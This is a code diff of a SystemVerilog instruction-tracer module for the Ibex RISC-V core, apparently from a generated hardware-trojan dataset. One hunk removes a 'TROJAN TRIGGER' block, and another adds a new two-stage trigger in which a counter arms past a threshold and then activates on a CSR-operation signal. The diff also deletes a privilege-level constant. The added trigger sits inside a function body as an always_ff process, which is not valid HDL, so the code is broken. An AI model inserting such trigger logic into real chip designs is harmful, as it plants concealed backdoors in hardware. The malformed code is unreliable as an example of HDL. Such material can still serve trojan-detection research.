@@ -70,27 +70,6 @@ module ibex_tracer_trojan_Privilege (
   input logic [15:0] rvfi_ext_expanded_insn
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 23629;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|rvfi_mode) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Bypasses) trojan_active <= 1'b1;
-        end
-    end
-
-
   // These signals are part of RVFI, but not used in this module currently.
   // Keep them as part of the interface to change the tracer more easily in the future. Assigning
   // these signals to unused_* signals marks them explicitly as unused, an annotation picked up by
@@ -856,6 +835,26 @@ module ibex_tracer_trojan_Privilege (
     predecessor = get_fence_description(rvfi_insn[27:24]);
     successor = get_fence_description(rvfi_insn[23:20]);
     decoded_str = $sformatf("fence\t%s,%s", predecessor, successor);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=16860)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 16860;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|hart_id_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
   endfunction
 
   // cycle counter
@@ -1225,8 +1224,5 @@ module ibex_tracer_trojan_Privilege (
       endcase
     end
   end
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule
